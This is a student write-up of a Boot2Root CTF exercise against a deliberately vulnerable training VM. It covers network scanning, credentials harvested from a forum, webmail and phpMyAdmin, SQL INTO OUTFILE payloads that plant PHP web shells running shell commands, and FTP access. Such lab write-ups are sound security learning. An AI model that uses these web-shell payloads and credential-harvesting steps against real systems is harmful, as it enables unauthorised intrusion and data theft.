# Boot2Root 42 Project - Write Up 1

## Step 1: find the VM's IP

BEFORE ANYTHING : when setting up your vm in network, set it to bridged adapter, select the wifi card in the section name and then, make sure you're also connected to a wifi

First, find your local ip so you scan it

```
on Windows :
>ipconfig
    Wireless LAN adapter Wi-Fi 2
        IPv4 Address. . . . . . . . . . . : 192.168.1.45
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . : 192.168.1.255

on Macs :
    Maxime je te laisse remplir ca
```

Now we know our local ip, so we'll scan it using nmap ans after a few minutes we end up with :

```
>nmap 192.168.1.0/24
...
    Nmap scan report for BornToSecHackMe-001.lan (192.168.1.74)
    Host is up (0.0031s latency).
    Not shown: 994 closed tcp ports (reset)
    PORT    STATE SERVICE
    21/tcp  open  ftp
    22/tcp  open  ssh
    80/tcp  open  http
    143/tcp open  imap
    443/tcp open  https
    993/tcp open  imaps
    MAC Address: DC:1B:A1:92:89:AC (Intel Corporate)
...
```

## Step 2: Use the port 443

Now that we know the ip of the vm all we need to do is to put it our browser to discover a simple web page asking to be hacked (cheeky page)

To do so, we'll use nikto by using
```
>perl nikto.pl -h 192.168.1.74 -p 443
...
    + OSVDB-3092: /forum/: This might be interesting.
    + OSVDB-3093: /webmail/src/read_body.php: SquirrelMail found
    + /phpmyadmin/: phpMyAdmin directory found
...
```
And now we can verify directly on our browser that yes, we have access to

    192.168.1.74/forum
    192.168.1.74/webmail
    192.168.1.74/phpmyadmin

## Step 3: Abuse the forum

first thing, we can see in the head that this forum is made using my little forum 2.3.4 an information usefull later.

But for now we'll go ont the forum and search for anything fishy, and something fishy we found on the topic "Problem login ?" where the user lmezard posted a log from a ssh connection.

And when you read the log you can find this line:

    Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2

which is lmezard's password on the forum

After loging in as them, the only new thing we get is a list of all the user registered on the forum and the User Area where we found their mail :

    laurie@borntosec.net

## Step 4: Webmail

Since we have laurie's mail we can login with the same password

And the first mail called "DB Access" contain with no surprise     

    Hey Laurie,

    You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

    Best regards.

## Step 5: PhpMyAdmin

As promised, the version of MLF is important now since we can see in the table  mlf2_userdata the hashed password of all the users.

But im too busy to care. Since we are root we can inject anything with SQL
and we have this https://www.informit.com/articles/article.aspx?p=1407358&seqNum=2

deux choses importantes:
1. https://192.168.1.74/forum/templates_c/.dummy doesn't cause any errors (/templates_c/.dummy is a file accessible in the git)
2. the principe of the sql request is to write in the templates_c directory in a new php file a php element executing a bash command

### Exploit 1:

    select "<?php $out = shell_exec('ls -laR /'); echo '<pre>' . $out . '</pre>'; ?>" into outfile "/var/www/forum/templates_c/ls.php";

Now https://192.168.1.74/forum/templates_c/ls.php display the result
and no surprise an easy to see LOOKATME folder is here so we just need to read what's inside the password file

### Exploit 2:

    select "<?php $out = shell_exec('cat /home/LOOKATME/password /'); echo '<pre>' . $out . '</pre>'; ?>" into outfile "/var/www/forum/templates_c/pogger.php";

and now https://192.168.1.74/forum/templates_c/pogger.php gives us

    lmezard:G!@M6f4Eatau{sF"

## Step 6: The ftp server

Since we can't login via ssh with those id, we will connect to the ftp server

to do so:
```
    pwd>ftp 192.168.1.74

    Connected to 192.168.1.74.
    220 Welcome on this server
    200 Always in UTF8 mode.
    User (192.168.1.74:(none)): lmezard
    331 Please specify the password.
    Password: G!@M6f4Eatau{sF"
    230 Login successful.
```

We'll use "dir" to list the file we have access to et get to retrieve them on our host.

The README file say that we'll get the ssh password of the user laurie using the "fun" file

So we have to tar -xf the file and get a bunch of .pcap files

## Fun's  solution

So since we're on our host, we have the wonderfull tool VSC, and we dont have to work on vim. so when you open anyway using vsc's built-in decoder, we'll get a lot of thing

and while scrolling you'll spot some getmeX() functions that you will find in random .pcap files and using the comment's number + 1 you'll find the letter corresponding

now that you have your 12 letters password hash it in sha-256 and you have your password for laurie
after retrieving  all the letter we end up with :
```
Iheartpwnage

in SHA-256:
    330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```
